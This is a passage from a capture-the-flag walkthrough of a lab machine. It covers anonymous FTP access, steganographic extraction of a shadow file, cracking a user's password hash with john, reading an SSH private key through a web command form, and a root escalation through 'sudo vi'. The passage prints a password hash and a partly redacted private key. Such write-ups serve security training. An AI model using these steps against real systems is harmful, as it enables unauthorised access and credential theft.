_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.note.gnu.build-id
```
So now we have the key.

Luckily it turns out that the FTP-server running on the machine has anonymous login enabled.
When we login to the server, we see a `.jpg` called `gum_room.jpg`. This smells like stego...
```
➜  /tmp ftp 10.10.231.176
Connected to 10.10.231.176.
220 (vsFTPd 3.0.3)
Name (10.10.231.176:emil): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
226 Transfer complete.
208838 bytes received in 1,01 seconds (202 kbytes/s)
```
Using `steghide` we can see if it contains any hidden data and extract it:
```
➜  /tmp steghide --info gum_room.jpg 
"gum_room.jpg":
  format: jpeg
  capacity: 10,9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "b64.txt":
    size: 2,5 KB
    encrypted: rijndael-128, cbc
    compressed: yes
➜  /tmp steghide extract -sf gum_room.jpg 
Enter passphrase: 
the file "b64.txt" does already exist. overwrite ? (y/n) n
steghide: did not write to file "b64.txt".
➜  /tmp rm b64.txt 
➜  /tmp steghide --info gum_room.jpg     
"gum_room.jpg":
  format: jpeg
  capacity: 10,9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "b64.txt":
    size: 2,5 KB
    encrypted: rijndael-128, cbc
    compressed: yes
➜  /tmp steghide extract -sf gum_room.jpg
Enter passphrase: 
wrote extracted data to "b64.txt".
➜  /tmp cat b64.txt 
ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
CnRjcGR1bXA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWlyZWRvOio6MTgzODI6MDo5OTk5OTo3Ojo6
CmRuc21hc3E6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoK
dXNibXV4Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnJ0a2l0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnNz
aGQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKcG9zdGdyZXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYXZh
aGk6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3R1bm5lbDQ6IToxODM4MjowOjk5OTk5Ojc6OjoKc3Ns
aDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpubS1vcGVudnBuOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm5t
LW9wZW5jb25uZWN0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnB1bHNlOio6MTgzODI6MDo5OTk5OTo3
Ojo6CnNhbmVkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmluZXRzaW06KjoxODM4MjowOjk5OTk5Ojc6
OjoKY29sb3JkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmkycHN2YzoqOjE4MzgyOjA6OTk5OTk6Nzo6
OgpkcmFkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYmVlZi14c3M6KjoxODM4MjowOjk5OTk5Ojc6
OjoKZ2VvY2x1ZToqOjE4MzgyOjA6OTk5OTk6Nzo6OgpsaWdodGRtOio6MTgzODI6MDo5OTk5OTo3
Ojo6CmtpbmctcGhpc2hlcjoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEh
OjE4Mzk2Ojo6Ojo6Cl9ycGM6KjoxODQ1MTowOjk5OTk5Ojc6OjoKc3RhdGQ6KjoxODQ1MTowOjk5
OTk5Ojc6OjoKX2d2bToqOjE4NDk2OjA6OTk5OTk6Nzo6OgpjaGFybGllOiQ2JENaSm5DUGVRV3A5
L2pwTngka2hHbEZkSUNKbnI4UjNKQy9qVFIycjdEcmJGTHA4enE4NDY5ZDNjMC56dUtONHNlNjFG
T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg==
```
Luckly there weren't any passphrase, so we extracted the info without having to crack it.
Decoding the b64 we get:
```
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/<REDACTED>.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```
Awesome! A shadow file, if we're able to crack Charlies hash, we can get access to the system with SSH.
If we add the hash to a file called `hash` we can use the `rockyou.txt` list and `john` to crack the hash.
```
➜  /tmp nano hash
➜  /tmp cat hash 
charlie:$6$CZJnCPeQWp9/<REDACTED>.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
➜  /tmp john --wordlist=/home/emil/KaliLists/rockyou.txt hash 
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>           (charlie)
1g 0:00:05:38 DONE (2021-01-23 13:36) 0.002952g/s 2907p/s 2907c/s 2907C/s codify..cn123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
We can now try to login as `charlie` via SSH:
```
➜  /tmp ssh charlie@10.10.231.176
The authenticity of host '10.10.231.176 (10.10.231.176)' can't be established.
ECDSA key fingerprint is SHA256:gd9u+ZN0RoEwz95lGsM97tRG/YPtIg9MwOxswHac8yM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.231.176' (ECDSA) to the list of known hosts.
charlie@10.10.231.176's password: 
Permission denied, please try again.
charlie@10.10.231.176's password: 
Permission denied, please try again.
charlie@10.10.231.176's password: 
charlie@10.10.231.176: Permission denied (publickey,password).
```
Damm no dice...
We can however try logging in via FTP:
```
➜  /tmp ftp 10.10.231.176
Connected to 10.10.231.176.
220 (vsFTPd 3.0.3)
Name (10.10.231.176:emil): charlie
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed.
ftp> quit
221 Goodbye.
```
No dice either, what about the web interface?
Awesome! That works. We're presented with a form that enables us to execute commands on the system.
We can read charlies RSA keys by running:
```
cat /home/charlie/teleport
cat /home/charlie/teleport.pub
```
If we save the output of these files, we can use the to login as Charlie via SSH.
```
➜  /tmp nano id_rsa
➜  /tmp cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
<REDACTED>
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
➜  /tmp ssh charlie@10.10.231.176 -i id_rsa
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 23 12:53:09 UTC 2021

  System load:  0.01              Processes:           1204
  Usage of /:   43.6% of 8.79GB   Users logged in:     0
  Memory usage: 47%               IP address for eth0: 10.10.231.176
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Jan 23 12:51:28 2021 from 10.9.129.26
Could not chdir to home directory /home/charley: No such file or directory
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

charlie@chocolate-factory:/$
```
Score! We're in!
We can now read the user flag:
```
charlie@chocolate-factory:/home/charlie$ cat user.txt 
flag{<REDACTED>}
```
Running `sudo -l` we see that we can execute `vi` with root privileges:
```
charlie@chocolate-factory:/$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```
While in `vi` we can run binaries and escape to a shell by typing `:!bash`.
```
charlie@chocolate-factory:/$ sudo vi

root@chocolate-factory:/#
``` 
Going to `/root` we find a file called `root.py`. When running it, it tells us to enter a key.
Entering the key we found when enumerating the machine reveals the flag:
```
root@chocolate-factory:/root# python root.py 
Enter the key:  b'<REDACTED>'
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag{<REDACTED>}
```
